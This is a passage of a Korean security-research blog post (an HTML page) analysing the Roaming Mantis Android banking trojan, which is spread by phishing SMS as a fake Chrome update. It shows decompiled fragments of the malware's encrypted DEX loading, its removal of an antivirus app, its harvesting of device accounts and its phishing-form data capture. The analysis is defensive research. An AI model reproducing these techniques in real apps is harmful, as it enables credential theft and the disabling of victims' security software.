<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta property="og:type" content="article">
<meta property="og:image" content="http://ufo.stealien.com/assets/og_image.png">
<meta property="og:title" content="STEALIEN Technical Blog">
<meta property="og:description" content="Android Malware : 사마귀 해부학">
<link href="https://fonts.googleapis.com/css?family=Nunito+Sans:400,400i,700&display=swap" rel="stylesheet">
<title>Android Malware : 사마귀 해부학</title>
<!-- Begin Jekyll SEO tag v2.7.1 -->
<title>Android Malware : 사마귀 해부학 | STEALIEN Technical Blog</title>
<meta name="generator" content="Jekyll v4.2.0" />
<meta property="og:title" content="Android Malware : 사마귀 해부학" />
<meta name="author" content="Hyerim Jeon" />
<meta property="og:locale" content="ko" />
<meta name="description" content="Android Malware : 사마귀 해부학" />
<meta property="og:description" content="Android Malware : 사마귀 해부학" />
<link rel="canonical" href="http://ufo.stealien.com/2023-11-15/Android-malware-%EC%82%AC%EB%A7%88%EA%B7%80-%ED%95%B4%EB%B6%80%ED%95%99-ko" />
<meta property="og:url" content="http://ufo.stealien.com/2023-11-15/Android-malware-%EC%82%AC%EB%A7%88%EA%B7%80-%ED%95%B4%EB%B6%80%ED%95%99-ko" />
<meta property="og:site_name" content="STEALIEN Technical Blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-11-15T10:00:00+09:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Android Malware : 사마귀 해부학" />
<script type="application/ld+json">
{"headline":"Android Malware : 사마귀 해부학","dateModified":"2023-11-15T10:00:00+09:00","datePublished":"2023-11-15T10:00:00+09:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://ufo.stealien.com/2023-11-15/Android-malware-%EC%82%AC%EB%A7%88%EA%B7%80-%ED%95%B4%EB%B6%80%ED%95%99-ko"},"author":{"@type":"Person","name":"Hyerim Jeon"},"@type":"BlogPosting","url":"http://ufo.stealien.com/2023-11-15/Android-malware-%EC%82%AC%EB%A7%88%EA%B7%80-%ED%95%B4%EB%B6%80%ED%95%99-ko","description":"Android Malware : 사마귀 해부학","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name=“naver-site-verification” content=“74a9ec74d48a1ffca92bf9ac4704ba73be9afd65" />
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous"/>
<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>
<link rel="stylesheet" href="/assets/css/style.css">

<link href="https://fonts.googleapis.com/css2?family=Nanum+Gothic:wght@400;700;800&display=swap" rel="stylesheet">

<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.0.3/styles/default.min.css">
<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.0.3/highlight.min.js"></script>

<link href="/assets/css/syntax.css" rel="stylesheet" >


<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-06FFJEF76M"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-06FFJEF76M');
</script>
</head>
<body>
	<header>
		<div class="container"></div><div id="header">
    <div class="container" style="display: flex;justify-content: space-between;">
        <a href="/">
            <img
                class="header_image_logo"
                src="/assets/logo.png"
                style="width: 140px; margin: 20px 28px 0px;"
            />
        </a>
        <a href="https://www.stealien.com/" target="_blank" style="font-family: 'NotoSansKR Medium', sans-serif;font-size: 14px;margin-right: 30px; color: #000; line-height: 70px;">스틸리언 홈페이지</a>
    </div>
</div>
</header>
	<section>
		<div>
			<div class="header_image_bg header_image_post" style="background-image: url('');">
    <div class="header_image_post_body">
        <div class="container">
            <div class="page-category">R&D</div>
            <div class="page-title">Android Malware : 사마귀 해부학</div>
            <div class="page-summary">
                <div style="float:left;">
                    <img class="page-profile_image" src="/assets/stealien_inverse.png" />
                    <span>Hyerim Jeon</span>
                </div>
                <div style="float:right;" class="page-date">Nov 15, 2023</div>
            </div>
        </div>
    </div>
</div>
<div class="container page-content">
    <h1 id="android-malware--사마귀-해부학">Android Malware : 사마귀 해부학</h1>

<p><br /></p>

<p><strong>목차</strong><br />
—————————————</p>
<ol>
  <li><strong>Intro</strong></li>
  <li><strong>Roaming Mantis?</strong></li>
  <li><strong>Analysis</strong>
    <ol>
      <li><strong>Download &amp; Install</strong></li>
      <li><strong>Dynamic Dex Loading</strong></li>
      <li><strong>Behavior Analysis</strong></li>
    </ol>
  </li>
  <li><strong>Outro</strong></li>
</ol>

<p><br /></p>

<h1 id="1-intro">1. Intro</h1>

<p><img src="/assets/2023-11-15-Android-malware-사마귀-해부학/19.png" alt="19.png" /></p>

<p>이 글의 주제가 되는 피싱 문자입니다. 5월 2일 실제로 많은 지인들에게 해당 문자가 배포되었습니다. 필자의 아버지가 매일 피싱 문자를 받지만, 광고 페이지로 Redirect 되는 것에 그쳤던 것에 반해 … 이 문자는 실제로 악성 앱이 설치됩니다.</p>

<p>이 글은 해당 앱을 실제로 설치, 분석하여 어떤 원리로 악성 행위가 일어나는 지 면밀히 관찰한 내용을 담고 있습니다.  저와 같이 보안 연구를 지망하고, 종사하시는 분들께 도움이 되길 바랍니다.</p>

<hr />

<h1 id="2-roaming-mantis">2. Roaming Mantis?</h1>

<p>분석 중에 알게 된 사실이지만, 너무 잘 만들었습니다. 정성이 느껴지는 로직이 아주 많습니다. 게다가 여러 이름으로 배포되고 있다는 것도 알게 되었습니다. 따라서 이미 알려진 Malware일 것 같아 확인해본 결과, 이 앱의 정체는..</p>

<p><img src="/assets/2023-11-15-Android-malware-사마귀-해부학/0.png" alt="0.png" /></p>

<p>Android Malware인 <strong>Roaming Mantis</strong>였습니다. 2018년에 처음으로 발견된 아주 오래 된 Malware입니다. 가장 많이 알려진 기능은 <strong>취약한 공용 라우터를 장악하여 DNS 서버를 변조</strong>(<strong>DNS Hijacking</strong>)하는 것으로, 그렇게 되면 사용자가 어떤 사이트로 가더라도 공격자의 서버로 이동할 수 밖에 없습니다.</p>

<p>가령, <code class="language-plaintext highlighter-rouge">google.com</code>으로 가더라도 공격자가 똑같이 만든 Google 페이지에서 로그인을 수행하게 될 것입니다. 그리고 이것은 같은 Wifi를 쓰는 모든 사용자에게 영향을 미칩니다.</p>

<p>이 앱은 다국가(일본, 오스트리아, 대한민국 등) 대상이지만, 2023년 관련 포스팅에 따르면 한국에 위치한 유명 네트워크 장비 공급 업체들의 라우터만을 표적으로 삼고 있다고 합니다.</p>

<p>또한 <strong>Wroba계열의 Mobile banking Trojan</strong>을 포함하고 있어, 해당 부분도 같이 살펴보게 될 것입니다.</p>

<p>출처 : <a href="https://www.kaspersky.com/about/press-releases/2023_roaming-mantis-uses-dns-changers-to-target-users-via-compromised-public-routers">https://www.kaspersky.com/about/press-releases/2023_roaming-mantis-uses-dns-changers-to-target-users-via-compromised-public-routers</a></p>

<hr />

<h1 id="3-analysis">3. Analysis</h1>

<p><img src="/assets/2023-11-15-Android-malware-사마귀-해부학/2.png" alt="2.png" /></p>

<p>분석 Flow Chart입니다.</p>

<p>각각의 과정이 매우 복잡하기 때문에 어떤 부분을 분석하는지 이해하고 읽어주시면 감사하겠습니다.</p>

<h2 id="1-download--install">1) Download &amp; Install</h2>

<p><img src="/assets/2023-11-15-Android-malware-사마귀-해부학/3.png" alt="3.png" /></p>

<p>문자의 URL에 접근하면 chrome 최신 버전으로 업데이트 하라는 안내 문자가 출력됩니다.</p>

<p>Download를 진행하면 <code class="language-plaintext highlighter-rouge">chrome.apk</code> 라는 파일이 다운로드 되며, 설치 후 앱을 실행하면 앱은 사라지고 상단 바에 chrome 로고를 확인할 수 있습니다. Background로 실행되기 때문에, 기기에 미숙한 사용자는 삭제 및 제어가 어려워집니다.</p>

<p><img src="/assets/2023-11-15-Android-malware-사마귀-해부학/4.png" alt="4.png" /></p>

<p>frida로 실행 중인 프로세스 목록을 확인해보면 chrome이 두 개가 된 것을 확인할 수 있습니다.</p>

<p>이 중 <code class="language-plaintext highlighter-rouge">rbj.xnmp.gjga.ucms</code>가 악성 앱, <code class="language-plaintext highlighter-rouge">com.android.chrome</code>이 진짜 chrome입니다.</p>

<h2 id="2-dynamic-dex-loading">2) Dynamic DEX Loading</h2>

<p>Dynamic DEX 복호화 과정을 분석해보겠습니다. Flow Chart는 아래와 같습니다.</p>

<p>주요한 Method의 로직을 보면서, 어떤 과정으로 Decrypt DEX 파일을 Loading하는지 분석해보겠습니다.</p>

<p><img src="/assets/2023-11-15-Android-malware-사마귀-해부학/5.png" alt="5.png" /></p>

<p><br /></p>

<p>① <strong>Encrypted DEX Loading</strong></p>

<p>가장 먼저 실행되는 것은 <code class="language-plaintext highlighter-rouge">ImApplication.c("rrkf")</code> 로, <code class="language-plaintext highlighter-rouge">rrkf</code>를 인자로 <code class="language-plaintext highlighter-rouge">wo.pi</code> method를 호출합니다.</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// str = "rrkf"</span>
<span class="kr">private</span> <span class="k">void</span> <span class="nx">c</span><span class="p">(</span><span class="nb">String</span> <span class="nx">str</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">b</span><span class="p">(</span><span class="nx">str</span><span class="p">,</span> <span class="nx">wo</span><span class="p">.</span><span class="nx">pi</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="nx">str</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="kc">false</span><span class="p">,</span> <span class="dl">""</span><span class="p">));</span>
<span class="p">}</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">Java_n_wo_pi()</code>  함수는 <code class="language-plaintext highlighter-rouge">rrkf</code>를 인자로 받아, <code class="language-plaintext highlighter-rouge">rrkf/lqcttjs</code> 경로를 완성합니다.</p>

<p>완성한 경로를 <code class="language-plaintext highlighter-rouge">getAssets()</code> 함수의 인자로 사용하여, <code class="language-plaintext highlighter-rouge">assets</code> 폴더 하위의 <code class="language-plaintext highlighter-rouge">rrkf/1qcttjs</code> 파일 내용을 가져옵니다.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// v7 = rrkf/1qcttjs</span>
<span class="c1">// v10 = getAssets()</span>
<span class="c1">// v13 = open(Ljava/lang/String;)</span>
<span class="n">v19</span> <span class="o">=</span> <span class="nl">_JNIEnv:</span><span class="o">:</span><span class="nc">CallObjectMethod</span><span class="o">(</span><span class="n">v7</span><span class="o">,</span> <span class="n">v10</span><span class="o">,</span> <span class="n">v13</span><span class="o">);</span>
</code></pre></div></div>

<p>실제로 <code class="language-plaintext highlighter-rouge">assets</code> Directory 에는 아래와 같이 <code class="language-plaintext highlighter-rouge">rrkf/1qcttjs</code> 경로의 파일이 있습니다. 해당 파일은 암호화된 내용으로, 정상적으로 읽을 순 없습니다.</p>

<p><img src="/assets/2023-11-15-Android-malware-사마귀-해부학/6.png" alt="6.png" /></p>

<p><br /></p>

<p>② <strong>Decrypt DEX</strong></p>

<p>따라서 <code class="language-plaintext highlighter-rouge">Java_n_wo_pi()</code> 내부에는 가져온 <code class="language-plaintext highlighter-rouge">1qcttjs</code> 의 내용의 복호화를 수행하는 로직이 있습니다. 복호화를 완료하면 <code class="language-plaintext highlighter-rouge">wo.pi</code> 는 Dectyped DEX 내용을 return 합니다.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">while</span> <span class="o">(</span> <span class="mi">1</span> <span class="o">)</span>
<span class="o">{</span>
    <span class="n">v49</span> <span class="o">=</span> <span class="nl">_JNIEnv:</span><span class="o">:</span><span class="nc">CallIntMethod</span><span class="o">(</span><span class="n">v24</span><span class="o">,</span> <span class="n">v61</span><span class="o">,</span> <span class="n">v21</span><span class="o">,</span> <span class="n">v48</span><span class="o">);</span> <span class="c1">// 1. 암호화된 파일 내용 read</span>
    <span class="k">if</span> <span class="o">(</span> <span class="n">v49</span> <span class="o">&amp;</span> <span class="mh">0x80000000</span> <span class="o">)</span> <span class="c1">// 3. 복호화가 끝났을경우</span>
    <span class="o">{</span>
      <span class="nl">_JNIEnv:</span><span class="o">:</span><span class="nc">CallVoidMethod</span><span class="o">(</span><span class="n">v24</span><span class="o">,</span> <span class="n">v61</span><span class="o">,</span> <span class="n">v59</span><span class="o">);</span> <span class="c1">// close(), 4. 읽기 종료</span>
			<span class="o">...</span>
			<span class="k">if</span> <span class="o">(</span> <span class="n">v64</span> <span class="o">)</span>
        <span class="o">{</span>
           <span class="n">v65</span> <span class="o">=</span> <span class="n">v64</span><span class="o">;</span> <span class="c1">// 5. 복호화 된 내용 저장</span>
           <span class="n">operator</span> <span class="nf">delete</span><span class="o">(</span><span class="n">v64</span><span class="o">);</span>
				<span class="o">}</span>
        <span class="k">return</span><span class="o">;</span>
    <span class="o">}</span>
    <span class="n">v50</span> <span class="o">=</span> <span class="o">(*(</span><span class="n">__int64</span> <span class="o">(</span><span class="n">__fastcall</span> <span class="o">**)(</span><span class="n">__int64</span><span class="o">,</span> <span class="n">__int64</span><span class="o">,</span> <span class="n">_QWORD</span><span class="o">))(*(</span><span class="n">_QWORD</span> <span class="o">*)</span><span class="n">v24</span> <span class="o">+</span> <span class="mi">1472L</span><span class="no">L</span><span class="o">))(</span><span class="n">v24</span><span class="o">,</span> <span class="n">v48</span><span class="o">,</span> <span class="mi">0L</span><span class="no">L</span><span class="o">);</span> <span class="c1">// 2. 복호화 진행 (1로 다시 이동)</span>
   <span class="o">...</span>
<span class="o">}</span>
</code></pre></div></div>

<p><br /></p>

<p><strong>③ Save Dynamic DEX</strong></p>

<p>복호화 된 DEX 파일의 내용은 어딘가 저장되어야 하는데, 그 과정은 <code class="language-plaintext highlighter-rouge">ImApplication.e()</code> method에서 확인할 수 있습니다. <code class="language-plaintext highlighter-rouge">e</code>는 <code class="language-plaintext highlighter-rouge">/data/user/0/rbj.xnpm.gjga.ucms/files/b</code> 와 복호화된 파일 내용을 인자로 받아, <code class="language-plaintext highlighter-rouge">wo.or</code> 을 호출합니다.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">private</span> <span class="kd">static</span> <span class="nc">Object</span> <span class="nf">e</span><span class="o">(</span><span class="nc">String</span> <span class="n">str</span><span class="o">,</span> <span class="nc">Object</span> <span class="n">obj</span><span class="o">)</span> <span class="o">{</span>
				<span class="c1">//str = "/data/user/0/rbj.xnpm.gjga.ucms/files/b"</span>
        <span class="c1">//obj = 복호화한 dex파일</span>
        <span class="k">return</span> <span class="n">wo</span><span class="o">.</span><span class="na">or</span><span class="o">(</span><span class="n">str</span><span class="o">,</span> <span class="n">obj</span><span class="o">,</span> <span class="mi">0</span><span class="o">);</span>
    <span class="o">}</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">Java_n_wo_or()</code> 에서는 인자로 받은 경로에 DEX 파일의 내용을 저장하는 것을 볼 수 있습니다.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">v7</span> <span class="o">=</span> <span class="o">(*(</span><span class="n">__int64</span> <span class="o">(**)(</span><span class="kt">void</span><span class="o">))(*(</span><span class="n">_QWORD</span> <span class="o">*)</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">1472L</span><span class="no">L</span><span class="o">))();</span> <span class="c1">// 복호화 DEX Byte array</span>
<span class="n">v8</span> <span class="o">=</span> <span class="o">(*(</span><span class="n">__int64</span> <span class="o">(</span><span class="n">__fastcall</span> <span class="o">**)(</span><span class="n">__int64</span><span class="o">,</span> <span class="n">__int64</span><span class="o">,</span> <span class="n">_QWORD</span><span class="o">))(*(</span><span class="n">_QWORD</span> <span class="o">*)</span><span class="n">v6</span> <span class="o">+</span> <span class="mi">1352L</span><span class="no">L</span><span class="o">))(</span><span class="n">v6</span><span class="o">,</span> <span class="n">v4</span><span class="o">,</span> <span class="mi">0L</span><span class="no">L</span><span class="o">);</span> <span class="c1">// /data/user/0/rbj.xnpm.gjga.ucms/files/b</span>
<span class="o">...</span>
<span class="n">fwrite</span><span class="o">(</span><span class="n">v7</span><span class="o">,</span> <span class="n">v10</span><span class="o">,</span> <span class="mi">1L</span><span class="no">L</span><span class="o">,</span> <span class="n">v9</span><span class="o">);</span> <span class="c1">// 해당 경로에 DEX파일 내용 작성</span>
</code></pre></div></div>

<p><strong>따라서 복호화된 DEX 파일은, <code class="language-plaintext highlighter-rouge">/data/user/0/rbj.xnpm.gjga.ucms/files/b</code> 경로에 저장되게 됩니다.</strong></p>

<p><br /></p>

<p><strong>④ Load Class</strong></p>

<p><code class="language-plaintext highlighter-rouge">ImApplication</code> 에서 가장 마지막에 실행되는 <code class="language-plaintext highlighter-rouge"></code>a</code> method입니다.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">private</span> <span class="kt">void</span> <span class="nf">a</span><span class="o">(</span><span class="nc">Object</span> <span class="n">obj</span><span class="o">)</span> <span class="o">{</span>
				<span class="c1">// obj = DexClassLoader(path = /data/user/0/rbj.xnpm.gjga.ucms/files/b)</span>
				<span class="c1">// wo.ls(1) = com.Loader</span>
        <span class="nc">Class</span> <span class="n">cls</span> <span class="o">=</span> <span class="o">(</span><span class="nc">Class</span><span class="o">)</span> <span class="n">wo</span><span class="o">.</span><span class="na">kw</span><span class="o">(</span><span class="n">wo</span><span class="o">.</span><span class="na">ls</span><span class="o">(</span><span class="mi">1</span><span class="o">),</span> <span class="n">obj</span><span class="o">,</span> <span class="kc">false</span><span class="o">,</span> <span class="mi">0L</span><span class="o">,</span> <span class="s">""</span><span class="o">,</span> <span class="kc">true</span><span class="o">,</span> <span class="mi">2</span><span class="o">,</span> <span class="kc">false</span><span class="o">,</span> <span class="mi">1</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
        <span class="k">this</span><span class="o">.</span><span class="na">b</span> <span class="o">=</span> <span class="n">cls</span><span class="o">;</span>
				<span class="c1">// wo.iz = 인자를 create() 함</span>
        <span class="n">a</span> <span class="o">=</span> <span class="n">wo</span><span class="o">.</span><span class="na">iz</span><span class="o">(</span><span class="n">cls</span><span class="o">);</span>
    <span class="o">}</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">wo.iz</code> 는 인자를 create() 하므로, 인자로 들어가는 <code class="language-plaintext highlighter-rouge">cls</code> 즉, <code class="language-plaintext highlighter-rouge">wo.kw</code> 의 내용을 보아야 합니다. <code class="language-plaintext highlighter-rouge">wo.kw</code>  는 아래의 코드로 동작을 요약할 수 있습니다.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// v7 = loadClass(com.Loader)</span>
<span class="k">return</span> <span class="nl">_JNIEnv:</span><span class="o">:</span><span class="nc">CallObjectMethod</span><span class="o">(</span><span class="n">v5</span><span class="o">,</span> <span class="n">v4</span><span class="o">,</span> <span class="n">v7</span><span class="o">);</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">locaClass()</code> method에 인자로 들어간 <code class="language-plaintext highlighter-rouge">com.Loader</code> Class를 호출합니다. 이렇게 <code class="language-plaintext highlighter-rouge">b</code> 파일의 <code class="language-plaintext highlighter-rouge">com.Loaser</code> class를 인자로 받은 <code class="language-plaintext highlighter-rouge">wo.iz</code> 는 이를 <code class="language-plaintext highlighter-rouge">create()</code> 하며 Dynamic DEX Loading은 끝이 납니다.</p>

<p><strong>그럼 이제 앱을 실행한 후, <code class="language-plaintext highlighter-rouge">/data/user/0/rbj.xnpm.gjga.ucms/files/b</code> 파일을 획득하 악성 앱이 어떤 일을 수행하는 지 분석해봅시다.</strong></p>

<h2 id="3-behavior-analysis">3) Behavior Analysis</h2>

<p>이전 단계에서 획득한 <code class="language-plaintext highlighter-rouge">b</code> 파일을 분석하여, 어떤 동작을 수행하게 되는지 분석해봅시다.</p>

<p>모든 동작을 분석하기엔 양이 너무 많으므로, 아래의 동작들에 대해서만 분석해보겠습니다.</p>

<p><strong>이 중 Roaming Mantis의 핵심 동작은 ⑤ 공유기 장악(DNS Hijacking) 부분을 보시면 되겠습니다.</strong></p>

<p><strong>① A사 백신 삭제</strong></p>

<p><strong>② 국내 앱 계정 정보 수집</strong></p>

<p><strong>③ Phishing 창 생성 #1</strong></p>

<p><strong>④ Phishing 창 생성 #2</strong></p>

<p><strong>⑤ 공유기 장악 (DNS Hijacking)</strong></p>

<p><strong>⑥ C2 서버 - 공격자 서버 정보 파싱</strong></p>

<p><strong>⑦ SMS 관련 동작</strong></p>

<p><strong>⑧ 기타 동작</strong></p>

<hr />

<p><strong>① A사 백신 삭제</strong></p>

<p>대한민국에서 가장 유명한 A사의 백신을 삭제하는 로직입니다.</p>

<p>while문을 사용하여 설치된 Package명 중, 백신의 Package명(<code class="language-plaintext highlighter-rouge">com.a**lab.v*</code>)과 같은 게 있을 경우 삭제하도록 하고 있습니다.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">while</span><span class="o">(!</span><span class="n">d</span><span class="o">.</span><span class="na">n</span><span class="o">.</span><span class="na">l</span><span class="o">.</span><span class="na">g</span><span class="o">(((</span><span class="nc">String</span><span class="o">)</span><span class="n">v1</span><span class="o">),</span> <span class="s">"com.a**lab.v3"</span><span class="o">,</span> <span class="kc">false</span><span class="o">,</span> <span class="mi">2</span><span class="o">,</span> <span class="kc">null</span><span class="o">));</span>
    <span class="n">v2</span> <span class="o">=</span> <span class="n">v1</span><span class="o">;</span> <span class="c1">// 1. com.a***.v* 으로 시작하는 Package명이 있다면 저장</span>
<span class="nl">label_14:</span>
    <span class="nc">String</span> <span class="n">v2_1</span> <span class="o">=</span> <span class="o">(</span><span class="nc">String</span><span class="o">)</span><span class="n">v2</span><span class="o">;</span>
    <span class="k">if</span><span class="o">(</span><span class="n">v2_1</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span> <span class="c1">// 2. 존재한다면, DELETE하는 Activity 실행</span>
        <span class="nc">Intent</span> <span class="n">v0_1</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
        <span class="n">v0_1</span><span class="o">.</span><span class="na">setAction</span><span class="o">(</span><span class="s">"android.intent.action.DELETE"</span><span class="o">);</span>
        <span class="n">v0_1</span><span class="o">.</span><span class="na">setData</span><span class="o">(</span><span class="nc">Uri</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="s">"package:"</span> <span class="o">+</span> <span class="n">v2_1</span><span class="o">));</span>
        <span class="n">v0_1</span><span class="o">.</span><span class="na">addFlags</span><span class="o">(</span><span class="mh">0x10000000</span><span class="o">);</span>
        <span class="n">arg8</span><span class="o">.</span><span class="na">startActivity</span><span class="o">(</span><span class="n">v0_1</span><span class="o">);</span> <span class="c1">// 안랩을 삭제하는 activity를 넣음</span>
    <span class="o">}</span>
</code></pre></div></div>

<p>실행된 Activity는 아래와 같이 보입니다.</p>

<p><img src="/assets/2023-11-15-Android-malware-사마귀-해부학/7.png" alt="7.png" /></p>

<hr />

<p><strong>② 국내 앱 계정 정보 수집</strong></p>

<p>아래는 기기에 저장된 계정들에 대해서 name과 type을 매칭하여 저장하는 로직입니다.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// 1. 기기에서 관리중인 계정 정보 수집</span>
<span class="nc">Account</span><span class="o">[]</span> <span class="n">v0_4</span> <span class="o">=</span> <span class="o">((</span><span class="nc">AccountManager</span><span class="o">)</span><span class="n">v0_3</span><span class="o">).</span><span class="na">getAccounts</span><span class="o">();</span>

<span class="c1">// 2. 계정과 종류를 수집</span>
<span class="n">v10_1</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">v0_4</span><span class="o">[</span><span class="n">v12</span><span class="o">].</span><span class="na">name</span> <span class="o">+</span> <span class="s">":"</span> <span class="o">+</span> <span class="n">v0_4</span><span class="o">[</span><span class="n">v12</span><span class="o">].</span><span class="na">type</span><span class="o">);</span>
</code></pre></div></div>

<p>수집한 type들 중 아래의 패키지명이 일치하는 계정이 있다면 내용을 수집합니다. 패키지명은 국내 게임사, OTP, 포인트 관련 패키지명들이었습니다.</p>

<p><img src="/assets/2023-11-15-Android-malware-사마귀-해부학/8.png" alt="8.png" /></p>

<p>아래는 S사의 포인트 앱 happy***** 의 저장 예시입니다.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">v9</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"Happy*****:"</span><span class="o">);</span> <span class="c1">// 계정이 존재한다면, comment와 함께 저장</span>
</code></pre></div></div>

<hr />

<p><strong>③ Phishing 창 생성 #1</strong></p>

<p><code class="language-plaintext highlighter-rouge">com.Loader</code> Class에는 static으로 정의 된 HTML/javascript 코드들이 있습니다. 해당 코드를 정적으로 확인하면 아래와 같은 Phishing 페이지를 확인할 수 있습니다. 여러 나라를 대상으로 악성 행위를 수행하기 때문에, 사용자의  환경에 따라 언어를 출력하도록 되어있습니다.</p>

<p><img src="/assets/2023-11-15-Android-malware-사마귀-해부학/9.png" alt="9.png" /></p>

<p>한국어에서 값을 가져와서 확인해보면, 아래 같은 페이지를 확인할 수 있습니다. 이 페이지는 <code class="language-plaintext highlighter-rouge">127.0.0.1:Random_port</code> 로 열리는 Web view Activity로, 사용자는 안전 인증 페이지로 오인하여 본인의 정보를 입력할 수 있습니다. 이 때 <code class="language-plaintext highlighter-rouge">%%ACCOUNT%%</code> 부분은 기기에 저장된 gmail 계정이 출력됩니다.</p>

<p><img src="/assets/2023-11-15-Android-malware-사마귀-해부학/10.png" alt="10.png" /></p>

<p>전달 받은 값은 <code class="language-plaintext highlighter-rouge">127.0.0.1:port/submit</code> 으로 전달, Response 값을 <code class="language-plaintext highlighter-rouge">setMyInfo</code> method로 JSON-RPC 통신하게 됩니다. 즉 공격자에게 전달됩니다.</p>

<ul>
  <li>JSON-RPC는 원격 프로시저 호출을 위한 프로토콜입니다. 서버와 경량의 데이터 교환을 수행하는데, 이 때 JSON 형식을 사용합니다.</li>
</ul>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">v8_1</span> <span class="o">=</span> <span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="n">v7</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"name"</span><span class="p">);</span>
<span class="n">v8_2</span><span class="p">.</span><span class="n">append</span><span class="p">(((</span><span class="n">String</span><span class="p">)</span><span class="n">v7</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"first_name"</span><span class="p">)));</span>
<span class="n">String</span> <span class="n">v0</span> <span class="o">=</span> <span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="n">v7</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"middle_name"</span><span class="p">);</span>
<span class="n">v8_2</span><span class="p">.</span><span class="n">append</span><span class="p">(((</span><span class="n">String</span><span class="p">)</span><span class="n">v7</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"last_name"</span><span class="p">)));</span>
<span class="n">String</span> <span class="n">v2_1</span> <span class="o">=</span> <span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="n">v7</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"date"</span><span class="p">);</span>
<span class="n">v2_1</span> <span class="o">=</span> <span class="n">v2_1</span> <span class="o">+</span> <span class="s">" "</span> <span class="o">+</span> <span class="p">((</span><span class="n">String</span><span class="p">)</span><span class="n">v7</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"xx1"</span><span class="p">));</span>
<span class="n">v2_1</span> <span class="o">=</span> <span class="n">v2_1</span> <span class="o">+</span> <span class="s">" "</span> <span class="o">+</span> <span class="p">((</span><span class="n">String</span><span class="p">)</span><span class="n">v7</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"xx2"</span><span class="p">));</span>
<span class="n">v2_1</span> <span class="o">=</span> <span class="n">v2_1</span> <span class="o">+</span> <span class="s">" "</span> <span class="o">+</span> <span class="p">((</span><span class="n">String</span><span class="p">)</span><span class="n">v7</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"xx3"</span><span class="p">));</span>
<span class="n">v2_1</span> <span class="o">=</span> <span class="n">v2_1</span> <span class="o">+</span> <span class="s">" "</span> <span class="o">+</span> <span class="p">((</span><span class="n">String</span><span class="p">)</span><span class="n">v7</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"xx4"</span><span class="p">));</span>
